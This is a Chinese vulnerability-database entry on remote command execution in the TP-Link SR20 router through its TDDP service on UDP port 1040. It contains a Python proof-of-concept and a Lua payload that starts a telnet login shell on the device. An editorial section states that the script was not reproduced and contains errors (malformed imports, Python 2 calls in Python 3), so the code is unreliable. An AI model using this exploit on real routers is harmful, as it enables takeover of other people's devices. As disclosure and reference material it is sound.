---
version: "TP-Link SR20"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-34e390bbacd19a8c1e69d2b7"
entity_id: "ve-34e390bbacd19a8c1e69d2b7"
schema_version: "1"
title: "TP-Link SR20 远程命令执行"
product: "TP-Link SR20"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "LAN可达、TFTP预置Lua配置；无版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/TP-Link/TP-Link-SR20-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# TP-Link SR20 远程命令执行

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TP-Link SR20
- 本文讨论：UDP1040配置加载远程命令执行；未编号
- 版本、权限与配置前提：LAN可达、TFTP预置Lua配置；无版本
- 资料类型：本地网络TDDP脚本；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- importbinascii/importsocket缺空格，Python3脚本又用Python2 encode('hex')
- TFTP服务器地址/传输触发及依赖说明不足，无原始研究链接或修复
- version元数据仅产品名

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证/协议前提及准确CVE/修复需核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。

## 漏洞影响

```
TP-Link SR20
```

## 漏洞POC

```python
#!/usr/bin/python3
# Create /testfile in your tftp root directory with the followingcontents:
#function config_test(config)
# os.execute("telnetd -l/bin/login.sh")
#end
# Replace 192.168.0.1 with the IP address of the vulnerable device
importbinascii
importsocket
port_send = 1040
port_receive = 61000
tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X"% 00
tddp_packet = "".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding])
sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(( '', port_receive))

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
packet = packet + b"/testfile;arbitrary"
print(packet)
sock_send.sendto(packet, ( "192.168.0.1", port_send))
sock_send.close()
response, addr = sock_receive.recvfrom( 1024)
r = response.encode( 'hex')
print(r)
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
